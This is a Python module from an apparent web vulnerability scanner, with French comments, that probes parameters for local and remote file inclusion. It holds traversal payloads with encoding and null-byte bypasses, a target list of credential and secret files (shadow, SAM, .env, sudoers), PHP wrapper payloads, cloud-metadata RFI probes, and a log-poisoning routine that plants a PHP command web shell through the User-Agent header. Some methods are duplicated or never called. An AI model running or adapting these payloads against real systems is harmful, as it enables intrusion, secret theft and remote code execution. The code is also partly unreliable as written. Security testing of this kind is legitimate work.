"""
PhantomScan — LFI / Path Traversal Scanner  (v5.0)
====================================================
Améliorations v5.0 :
- Payloads enrichis : encodages doubles/triples, null-byte étendu, UNC Windows,
  wrappers PHP complets (zip://, phar://, glob://, iconv, zlib),
  séquences Unicode (%c0%af, %c1%9c), mixed slashes, strip-slash.
- Test POST : paramètres testés en POST form-urlencoded + JSON body.
- Log poisoning : injection PHP dans User-Agent avant de tenter LFI sur les logs.
- RFI : Remote File Inclusion avec URL canary + combo AWS meta-data.
- Baseline diff : ratio de taille pour détecter les changements significatifs.
- Severity granulaire : CRITICAL / HIGH / MEDIUM selon le fichier cible.
- 25 fichiers cibles (vs 11 avant) : .env, /proc/net/tcp, auth.log, MySQL, PHP ini...
- Profondeurs variables : depth, depth+2, depth+4 générés automatiquement.
- Déduplication des payloads générés.
"""

from __future__ import annotations

import asyncio
import base64
import json
import re
from typing import AsyncIterator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.intelligence import SemanticParamClassifier, ParamRole


# ── Cibles LFI ────────────────────────────────────────────────────────────────

LFI_TARGETS: list[tuple[str, str, re.Pattern, Severity]] = [
    ("/etc/passwd",
     "Linux passwd",
     re.compile(r"root:.*:/bin/(?:bash|sh|nologin|false)", re.S),
     Severity.CRITICAL),

    ("/etc/shadow",
     "Linux shadow",
     re.compile(r"root:\$[0-9a-z]+\$", re.S),
     Severity.CRITICAL),

    ("/etc/hosts",
     "Linux hosts",
     re.compile(r"127\.0\.0\.1\s+localhost", re.I),
     Severity.HIGH),

    ("/etc/os-release",
     "OS Release",
     re.compile(r"^(?:ID|NAME|VERSION)=", re.I | re.M),
     Severity.HIGH),

    ("/proc/self/environ",
     "Process environ",
     re.compile(r"PATH=|HOME=|USER=|SHELL=", re.I),
     Severity.CRITICAL),

    ("/proc/self/cmdline",
     "Process cmdline",
     re.compile(r"php|python|node|ruby|java|perl|uwsgi|gunicorn", re.I),
     Severity.HIGH),

    ("/proc/version",
     "Kernel version",
     re.compile(r"Linux version \d+\.\d+", re.I),
     Severity.MEDIUM),

    ("/proc/net/tcp",
     "Réseau TCP interne",
     re.compile(r"[0-9A-F]{8}:[0-9A-F]{4}\s", re.I),
     Severity.HIGH),

    # Windows
    ("C:/Windows/win.ini",
     "Windows win.ini",
     re.compile(r"\[fonts\]|\[extensions\]", re.I),
     Severity.CRITICAL),

    ("C:/Windows/System32/drivers/etc/hosts",
     "Windows hosts",
     re.compile(r"127\.0\.0\.1", re.I),
     Severity.HIGH),

    ("C:/boot.ini",
     "Windows boot.ini",
     re.compile(r"\[boot loader\]", re.I),
     Severity.HIGH),

    ("C:/Windows/System32/config/SAM",
     "Windows SAM",
     re.compile(r"HKLM|Administrator", re.I),
     Severity.CRITICAL),

    # Logs (log poisoning)
    ("/var/log/apache2/access.log",
     "Apache access log",
     re.compile(r'"(?:GET|POST|PUT|DELETE|HEAD) /', re.I),
     Severity.HIGH),

    ("/var/log/apache2/error.log",
     "Apache error log",
     re.compile(r"\[error\]|\[warn\]|AH\d{5}", re.I),
     Severity.HIGH),

    ("/var/log/nginx/access.log",
     "Nginx access log",
     re.compile(r'"(?:GET|POST) /', re.I),
     Severity.HIGH),

    ("/var/log/nginx/error.log",
     "Nginx error log",
     re.compile(r"open\(\)|failed to|crit|error", re.I),
     Severity.HIGH),

    ("/var/log/auth.log",
     "Auth log SSH/PAM",
     re.compile(r"sshd|pam_unix|Failed password|Accepted", re.I),
     Severity.CRITICAL),

    # Config apps
    ("/etc/php/php.ini",
     "PHP config",
     re.compile(r"allow_url_include|disable_functions|open_basedir", re.I),
     Severity.HIGH),

    ("/etc/mysql/my.cnf",
     "MySQL config",
     re.compile(r"\[mysqld\]|datadir=|bind-address", re.I),
     Severity.HIGH),

    ("/.env",
     "Dotenv secrets (racine)",
     re.compile(r"DB_PASSWORD|SECRET_KEY|API_KEY|TOKEN", re.I),
     Severity.CRITICAL),

    ("/app/.env",
     "Dotenv secrets (app)",
     re.compile(r"DB_|SECRET|KEY|TOKEN|PASS", re.I),
     Severity.CRITICAL),

    ("/var/www/html/.env",
     "Dotenv secrets (www)",
     re.compile(r"DB_|SECRET|KEY|TOKEN|PASS", re.I),
     Severity.CRITICAL),

    ("/etc/ssh/sshd_config",
     "SSH daemon config",
     re.compile(r"PermitRootLogin|AuthorizedKeysFile|Port \d+", re.I),
     Severity.HIGH),

    ("/etc/crontab",
     "Crontab système",
     re.compile(r"\*/\d+|@reboot|@hourly|@daily", re.I),
     Severity.MEDIUM),

    ("/etc/sudoers",
     "Sudoers",
     re.compile(r"ALL=\(ALL\)|NOPASSWD", re.I),
     Severity.CRITICAL),
]


# ── Wrappers PHP ──────────────────────────────────────────────────────────────

def _php_wrappers(target_path: str) -> list[tuple[str, str, Severity]]:
    return [
        (
            f"php://filter/convert.base64-encode/resource={target_path}",
            f"PHP filter base64-encode → {target_path}",
            Severity.CRITICAL,
        ),
        (
            f"php://filter/read=string.rot13/resource={target_path}",
            f"PHP filter rot13 → {target_path}",
            Severity.CRITICAL,
        ),
        (
            f"php://filter/convert.iconv.UTF-8.UTF-16/resource={target_path}",
            f"PHP filter iconv UTF-16 → {target_path}",
            Severity.CRITICAL,
        ),
        (
            f"php://filter/zlib.deflate/convert.base64-encode/resource={target_path}",
            f"PHP filter zlib+b64 → {target_path}",
            Severity.CRITICAL,
        ),
        (
            f"file://{target_path}",
            f"file:// wrapper → {target_path}",
            Severity.HIGH,
        ),
        (
            f"phar://{target_path}",
            f"phar:// wrapper → {target_path}",
            Severity.HIGH,
        ),
    ]


# ── Paramètres suspects ───────────────────────────────────────────────────────

LFI_PARAMS = {
    "file", "page", "path", "include", "require", "load", "read",
    "template", "view", "document", "doc", "filename", "filepath",
    "dir", "folder", "base", "theme", "module", "lang", "language",
    "locale", "inc", "src", "source", "url", "content", "data",
    "resource", "location", "layout", "partials", "partial",
    "section", "route", "render", "action", "param", "config",
    "conf", "setting", "preset", "ref", "cat", "category",
}

_RFI_PROBES = [
    "http://example.com/phantom_rfi_test.txt",
    "http://169.254.169.254/latest/meta-data/",  # AWS
]
_RFI_CONFIRM = re.compile(r"phantom_rfi|ami-id|instance-id|iam/security", re.I)


# ── Génération des payloads ───────────────────────────────────────────────────

def _depth_variants(base: int) -> list[int]:
    return sorted({max(1, base - 1), base, base + 2, base + 4})


def _dedupe(lst: list[str]) -> list[str]:
    seen: set[str] = set()
    out: list[str] = []
    for x in lst:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out


def _build_traversal_payloads(target_path: str, depth: int) -> list[str]:
    payloads: list[str] = []
    is_windows = ("Windows" in target_path or "boot.ini" in target_path
                  or target_path.startswith("C:"))
    clean = target_path.lstrip("/")
    win   = clean.replace("/", "\\")

    for d in _depth_variants(depth):
        # ── Unix encodings ─────────────────────────────────────────────
        variants = [
            "../" * d,                # standard
            "..%2F" * d,              # URL-encoded /
            "..%252F" * d,            # double-encoded /
            "%2e%2e%2f" * d,          # full hex
            "%2e%2e/" * d,            # mixed
            "..%c0%af" * d,           # Unicode overlong
            "..%c1%9c" * d,           # Unicode overlong alt
            "..%5C" * d,              # backslash encoded
            "..%255C" * d,            # double-encoded backslash
        ]
        for v in variants:
            payloads.append(f"{v}{clean}")
            payloads.append(f"{v}{clean}%00")
            payloads.append(f"{v}{clean}%00.php")
            payloads.append(f"{v}{clean}\x00")

        # Normalisation bypass
        payloads.append(f"{'../' * d}{'.' * d}/{clean}")
        payloads.append(f"{'/./' * (d // 2 + 1)}{'../' * d}{clean}")
        payloads.append(f"{'..///' * d}{clean}")

        # ── Windows ────────────────────────────────────────────────────
        if is_windows:
            for wv in ["..\\" * d, "..%5C" * d, "..%255C" * d]:
                payloads.append(f"{wv}{win}")
                payloads.append(f"{wv}{win}%00")
            payloads.append(f"{'..\\/' * d}{clean}")

    return _dedupe(payloads)


# ── Scanner ───────────────────────────────────────────────────────────────────

class LFIScanner:
    _LOG_MARKER = "PhantomScan-<?php echo 'PSLFI'; ?>"

    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req   = req
        self._heur  = heuristic
        self._cfg   = cfg
        self._depth = cfg.scan.lfi_depth
        self._bus   = None  # v5.6

    def set_endpoint_bus(self, bus) -> None:
        self._bus = bus

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if params:
            baseline_resp = await self._req.get(target)
            self._baseline_body: str = baseline_resp.body if not baseline_resp.error else ""
            self._baseline_len: int  = len(self._baseline_body)
            self._php_detected: bool = self._heur.has_tech("PHP") if hasattr(self._heur, "has_tech") else self._detect_php_from_baseline(target)
            await self._poison_logs(target)

            # v5.18 — Classer les params par rôle sémantique : PATH/FORMAT en priorité
            clf = SemanticParamClassifier()
            roles = clf.classify_params(list(params.keys()))
            path_params = [p for p, role in roles.items() if role in (ParamRole.PATH, ParamRole.FORMAT, ParamRole.TEMPLATE)]
            other_params = [p for p in params if p not in path_params]
            # Compatibilité avec l'ancienne logique LFI_PARAMS : les PATH sémantiques passent d'abord
            priority_lfi = [p for p in path_params if p.lower() in LFI_PARAMS] + \
                           [p for p in path_params if p.lower() not in LFI_PARAMS]
            fallback_lfi  = [p for p in other_params if p.lower() in LFI_PARAMS]
            remaining     = [p for p in other_params if p.lower() not in LFI_PARAMS]
            ordered_params = priority_lfi + fallback_lfi + remaining

            for param in ordered_params:
                async for f in self._test_param(target, parsed, params, param):
                    yield f

            for param in ordered_params:
                if param.lower() in LFI_PARAMS or param in path_params:
                    async for f in self._test_rfi(target, parsed, params, param):
                        yield f

        # v5.6 — endpoints bus
        if self._bus is not None:
            seen: set[str] = set()
            for ep in self._bus.snapshot:
                if ep.url in seen:
                    continue
                seen.add(ep.url)
                from urllib.parse import urlparse as _up, parse_qs as _pqs
                p = _up(ep.url)
                ep_params = _pqs(p.query, keep_blank_values=True)
                if not ep_params:
                    continue
                if not hasattr(self, "_baseline_body"):
                    bl = await self._req.get(ep.url)
                    self._baseline_body = bl.body if not bl.error else ""
                    self._baseline_len = len(self._baseline_body)
                    self._php_detected = self._heur.has_tech("PHP") if hasattr(self._heur, "has_tech") else False
                for param in ep_params:
                    if param.lower() in LFI_PARAMS:
                        async for f in self._test_param(ep.url, p, ep_params, param):
                            yield f

    # ── Test param ────────────────────────────────────────────────────────────


    async def _test_log_poisoning(self, target: str) -> AsyncIterator[Finding]:
        """
        v5.20 — Log Poisoning via LFI.
        Technique : injecter du PHP dans les logs Apache/Nginx (via User-Agent
        ou X-Forwarded-For), puis inclure le fichier de log via LFI.

        2 phases :
          1. Empoisonner le log avec un payload PHP via User-Agent
          2. Inclure le log via LFI et chercher l'output de la commande
        """
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        from phantomscan.core.requester import ProbeRequest
        parsed = urlparse(target)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return

        # Logs courants à tester
        log_files = [
            "../../../../../var/log/apache2/access.log",
            "../../../../../var/log/apache/access.log",
            "../../../../../var/log/nginx/access.log",
            "../../../../../proc/self/fd/2",          # stderr souvent = access log
            "../../../../../var/log/httpd/access_log",
            "../../../../../var/log/apache2/error.log",
        ]

        # Phase 1 : empoisonner le log
        poison_payload = "<?php system($_GET['cmd']); ?>"
        poison_marker  = "PHANTOM_LFI_POISON_TEST"

        # Envoyer une requête avec User-Agent contenant le PHP
        await self._req.send(ProbeRequest(
            method="GET",
            url=target,
            headers={"User-Agent": poison_payload},
        ))

        # Phase 2 : tester l'inclusion pour chaque log
        cmd_output_re = re.compile(r"uid=\d+\(\w+\)\s+gid=\d+", re.I)

        for log_path in log_files:
            for param in list(params.keys())[:2]:
                fuzzed = {**params, param: [log_path]}
                fuzz_url = urlunparse(parsed._replace(
                    query=urlencode(fuzzed, doseq=True)
                ))
                # Inclure le log et tenter d'exécuter cmd=id
                fuzz_url_cmd = fuzz_url + "&cmd=id"
                resp = await self._req.get(fuzz_url_cmd)
                if resp.error:
                    continue

                body = resp.body or ""
                # Chercher soit le marker PHP reflété (log inclus) soit l'output cmd
                if "<?php" in body or cmd_output_re.search(body):
                    if not self._in_baseline(re.compile(r"<\?php|uid=\d+\(")):
                        match = cmd_output_re.search(body)
                        severity = Severity.CRITICAL if match else Severity.HIGH
                        yield Finding(
                            title=f"LFI + Log Poisoning {'RCE' if match else 'confirmed'} · param `{param}`",
                            severity=severity,
                            url=fuzz_url_cmd,
                            module="vulns/lfi",
                            description=(
                                f"Log Poisoning confirmé : un payload PHP a été injecté "
                                f"dans {log_path} via User-Agent, puis inclus via le paramètre "
                                f"`{param}`. "
                                + (f"Sortie `id` : `{match.group(0)}`" if match
                                   else "Le fichier de log PHP-empoisonné est inclus.")
                            ),
                            evidence=(
                                f"Log: {log_path} | param: {param} | "
                                f"{'cmd output: ' + match.group(0) if match else 'PHP tag in response'}"
                            ),
                            cwe="CWE-98",
                            remediation=(
                                "Valider strictement les valeurs passées aux fonctions d'inclusion. "
                                "Ne jamais permettre l'inclusion de fichiers arbitraires. "
                                "Désactiver allow_url_include, utiliser open_basedir."
                            ),
                        )
                        return  # Un finding suffit

    async def _test_proc_fd(self, target: str) -> AsyncIterator[Finding]:
        """
        v5.20 — /proc/self/fd/ traversal pour LFI via file descriptors ouverts.
        Le fd 0,1,2 (stdin/stdout/stderr) et les fd plus élevés peuvent pointer
        vers des fichiers de config ou de log intéressants.
        """
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(target)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return

        # /proc/self/fd/N → pointer vers un fichier ouvert du process
        fd_paths = [
            "../../../../../proc/self/fd/0",   # stdin
            "../../../../../proc/self/fd/1",   # stdout
            "../../../../../proc/self/fd/2",   # stderr / log
            "../../../../../proc/self/fd/3",   # souvent le socket
            "../../../../../proc/self/fd/10",  # parfois un fichier de config
            "../../../../../proc/self/environ",
            "../../../../../proc/self/cmdline",
        ]

        sensitive_re = re.compile(
            r"DB_PASS|PASSWORD|SECRET|API_KEY|AWS_ACCESS|PRIVATE_KEY|"
            r"root:x:0:0|/bin/bash|/usr/bin/python",
            re.I,
        )

        for fd_path in fd_paths:
            for param in list(params.keys())[:2]:
                fuzzed = {**params, param: [fd_path]}
                fuzz_url = urlunparse(parsed._replace(
                    query=urlencode(fuzzed, doseq=True)
                ))
                resp = await self._req.get(fuzz_url)
                if resp.error:
                    continue

                body = resp.body or ""
                match = sensitive_re.search(body)
                if match and not self._in_baseline(sensitive_re):
                    yield Finding(
                        title=f"LFI /proc/self/fd — données sensibles exposées · param `{param}`",
                        severity=Severity.HIGH,
                        url=fuzz_url,
                        module="vulns/lfi",
                        description=(
                            f"Inclusion de `/proc/self/fd/` confirmée via `{param}`. "
                            f"Des données sensibles ont été détectées : `{match.group(0)}`."
                        ),
                        evidence=f"Path: {fd_path} | Match: {match.group(0)[:80]}",
                        cwe="CWE-22",
                        remediation=(
                            "Valider et restreindre les valeurs de paramètre. "
                            "Utiliser une allowlist de fichiers autorisés. "
                            "open_basedir=/var/www/html."
                        ),
                    )
                    return

    async def _test_rfi(self, target: str) -> AsyncIterator[Finding]:
        """
        v5.20 — Remote File Inclusion (RFI) : si allow_url_include est activé,
        le LFI peut devenir un RFI en passant une URL externe.
        Teste avec un serveur OOB ou une URL bénigne contrôlée.
        """
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(target)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return

        # Utiliser le canary OOB si disponible pour détecter le callback
        canary = self.get_canary(tag="rfi")
        if canary:
            rfi_url = canary.http_url
        else:
            # Fallback : URL bénigne (example.com ne retourne pas de code exécutable)
            rfi_url = "http://example.com/"

        for param in list(params.keys())[:3]:
            fuzzed = {**params, param: [rfi_url]}
            fuzz_url = urlunparse(parsed._replace(
                query=urlencode(fuzzed, doseq=True)
            ))
            resp = await self._req.get(fuzz_url)
            if resp.error:
                continue

            # Vérifier si le contenu distant est inclus
            if canary:
                hits = await self.wait_for_oob_hit(canary, timeout=8.0)
                if hits:
                    yield Finding(
                        title=f"RFI CONFIRMED via OOB callback · param `{param}`",
                        severity=Severity.CRITICAL,
                        url=fuzz_url,
                        module="vulns/lfi",
                        description=(
                            f"Remote File Inclusion confirmée via OOB callback. "
                            f"Le serveur a effectué une requête HTTP vers l'URL injectée "
                            f"({canary.http_url}). Un attaquant peut inclure du code PHP "
                            f"arbitraire depuis un serveur distant."
                        ),
                        evidence=f"OOB callback received | param={param} | proto={hits[0].get('protocol','?')}",
                        cwe="CWE-98",
                        remediation=(
                            "Désactiver allow_url_include=0 dans php.ini. "
                            "Ne jamais passer des URLs non validées aux fonctions include/require."
                        ),
                    )
                    return
            else:
                # Fallback : si example.com est inclus → RFI possible (LOW confidence)
                if "Example Domain" in (resp.body or "") and not self._in_baseline(
                    re.compile(r"Example Domain")
                ):
                    yield Finding(
                        title=f"RFI possible · param `{param}` (low confidence)",
                        severity=Severity.HIGH,
                        url=fuzz_url,
                        module="vulns/lfi",
                        description=(
                            f"Le paramètre `{param}` semble inclure le contenu d'URLs distantes. "
                            "Le contenu d'example.com a été retrouvé dans la réponse. "
                            "Confirmer manuellement avec un serveur contrôlé ou via --oob interactsh."
                        ),
                        evidence=f"'Example Domain' found in response | param={param}",
                        cwe="CWE-98",
                        remediation="Désactiver allow_url_include=0 dans php.ini.",
                    )
                    return

    async def _test_param(
        self, target: str, parsed, params: dict, param: str
    ) -> AsyncIterator[Finding]:
        for file_path, file_desc, signature, severity in LFI_TARGETS:
            if self._in_baseline(signature):
                continue

            payloads = _build_traversal_payloads(file_path, self._depth)

            # GET
            async for f in self._try_get(
                target, parsed, params, param,
                payloads, file_path, file_desc, signature, severity
            ):
                yield f
                break  # un finding par (param, fichier) suffit

            # POST form-urlencoded
            async for f in self._try_post(
                target, params, param, payloads,
                file_path, file_desc, signature, severity,
                "application/x-www-form-urlencoded"
            ):
                yield f
                break

            # POST JSON
            async for f in self._try_post(
                target, params, param, payloads,
                file_path, file_desc, signature, severity,
                "application/json"
            ):
                yield f
                break

        # Wrappers PHP — uniquement si PHP détecté par le fingerprint
        if self._php_detected:
            for php_path, _, sig, _ in LFI_TARGETS[:3]:
                for payload, desc, sev in _php_wrappers(php_path):
                    async for f in self._try_wrapper(
                        target, parsed, params, param, payload, php_path, desc, sig, sev
                    ):
                        yield f

    # ── GET ───────────────────────────────────────────────────────────────────

    async def _try_get(
        self, target, parsed, params, param,
        payloads, file_path, file_desc, signature, severity
    ) -> AsyncIterator[Finding]:
        for payload in payloads:
            fuzzed = {**params, param: [payload]}
            url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            resp = await self._req.get(url)
            if resp.error or resp.status not in (200, 206):
                continue
            if self._confirmed(resp.body, signature):
                yield self._finding(
                    url, param, payload, file_path, file_desc, severity, "GET"
                )
                return

    # ── POST ──────────────────────────────────────────────────────────────────

    async def _try_post(
        self, target, params, param, payloads,
        file_path, file_desc, signature, severity, ct
    ) -> AsyncIterator[Finding]:
        for payload in payloads:
            body_map = {k: (v[0] if v else "") for k, v in params.items()}
            body_map[param] = payload

            body = json.dumps(body_map) if ct == "application/json" else urlencode(body_map)
            resp = await self._req.post(target, body=body, headers={"Content-Type": ct})
            if resp is None or getattr(resp, "error", True):
                continue
            if getattr(resp, "status", 0) not in (200, 201):
                continue
            if self._confirmed(resp.body, signature):
                yield self._finding(
                    target, param, payload, file_path, file_desc, severity,
                    f"POST ({ct})"
                )
                return

    # ── Wrapper PHP ───────────────────────────────────────────────────────────

    async def _try_wrapper(
        self, target, parsed, params, param,
        payload, file_path, desc, signature, severity
    ) -> AsyncIterator[Finding]:
        fuzzed = {**params, param: [payload]}
        url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
        resp = await self._req.get(url)
        if resp.error or resp.status not in (200, 206):
            return

        confirmed = False
        if "base64-encode" in payload:
            try:
                decoded = base64.b64decode(resp.body.strip(), validate=True)
                confirmed = len(decoded) > 20
            except Exception:
                pass
        elif "rot13" in payload:
            import codecs
            decoded_rot = codecs.decode(resp.body.strip(), "rot_13")
            confirmed = bool(signature.search(decoded_rot))
        else:
            confirmed = self._confirmed(resp.body, signature)

        if confirmed:
            yield self._finding(
                url, param, payload, file_path, desc, severity, "GET (PHP wrapper)"
            )

    # ── RFI ───────────────────────────────────────────────────────────────────

    async def _test_rfi(
        self, target, parsed, params, param
    ) -> AsyncIterator[Finding]:
        for rfi_url in _RFI_PROBES:
            fuzzed = {**params, param: [rfi_url]}
            url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            resp = await self._req.get(url)
            if resp.error or resp.status not in (200, 201):
                continue
            if _RFI_CONFIRM.search(resp.body):
                yield Finding(
                    title=f"RFI — Remote File Inclusion · param `{param}`",
                    severity=Severity.CRITICAL,
                    url=url,
                    module="vulns/lfi",
                    description=(
                        f"Inclusion de fichier distant confirmée via `{param}`. "
                        "Le serveur a chargé une ressource externe contrôlée par l'attaquant."
                    ),
                    evidence=f"Payload: {rfi_url[:80]} | HTTP {resp.status}",
                    cwe="CWE-98",
                    remediation=(
                        "Désactiver allow_url_include et allow_url_fopen dans php.ini. "
                        "Ne jamais construire des chemins d'inclusion depuis des entrées utilisateur."
                    ),
                )

    # ── Log poisoning ─────────────────────────────────────────────────────────

    async def _poison_logs(self, target: str) -> None:
        try:
            await self._req.get(target, headers={"User-Agent": self._LOG_MARKER})
        except Exception:
            pass

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _in_baseline(self, signature: re.Pattern) -> bool:
        return bool(signature.search(self._baseline_body))

    def _confirmed(self, body: str, signature: re.Pattern) -> bool:
        if not signature.search(body):
            return False
        if self._in_baseline(signature):
            return False
        # v5.20 — Vérifier l'entropie de la signature : éviter les FP sur
        # des patterns comme "root" qui peuvent être dans n'importe quelle page.
        match = signature.search(body)
        if match:
            from phantomscan.core.fp_guard import sig_entropy_ok
            if not sig_entropy_ok(match.group(0), body, min_entropy=2.0):
                return False
        return True

    def _body_changed(self, body: str) -> bool:
        new_len = len(body)
        if self._baseline_len == 0:
            return new_len > 50
        # v5.20 — Utiliser stable_diff normalisé au lieu du ratio de taille brut
        from phantomscan.core.fp_guard import stable_diff as _sd
        diff = _sd(self._baseline_body, body)
        # threshold adaptatif : pages dynamiques tolèrent plus de variation naturelle
        bl = self._heur.baseline
        threshold = 0.15 if (bl and bl.is_dynamic) else 0.10
        return diff > threshold

    def _detect_php_from_baseline(self, target: str) -> bool:
        """
        Fallback si l'HeuristicEngine n'expose pas has_tech() :
        infère PHP depuis l'URL (.php) ou les headers X-Powered-By déjà observés
        dans le body de baseline (headers non accessibles ici, on se base sur l'URL).
        """
        url_lower = target.lower()
        if ".php" in url_lower:
            return True
        # Regarde si le body de baseline contient des indices PHP courants
        baseline = self._baseline_body.lower()
        php_hints = ("x-powered-by: php", "phpsessid", "<?php", "fatal error", "parse error")
        return any(h in baseline for h in php_hints)

    @staticmethod
    def _finding(
        url: str, param: str, payload: str,
        file_path: str, file_desc: str,
        severity: Severity, method: str,
    ) -> Finding:
        return Finding(
            title=f"LFI / Path Traversal — {file_desc} · param `{param}`",
            severity=severity,
            url=url,
            module="vulns/lfi",
            description=(
                f"Inclusion de fichier local confirmée : `{file_path}` "
                f"accessible via le paramètre `{param}` (méthode {method})."
            ),
            evidence=f"Payload: {payload[:100]} | Fichier: {file_desc} | {method}",
            cwe="CWE-22",
            remediation=(
                "Ne jamais utiliser des données utilisateur dans des appels include/require "
                "ou file_get_contents sans validation stricte. "
                "Utiliser une liste blanche de fichiers autorisés. "
                "Désactiver allow_url_include, open_basedir ouvert et les wrappers PHP dangereux. "
                "Appliquer chroot ou containérisation pour restreindre l'accès au filesystem."
            ),
        )
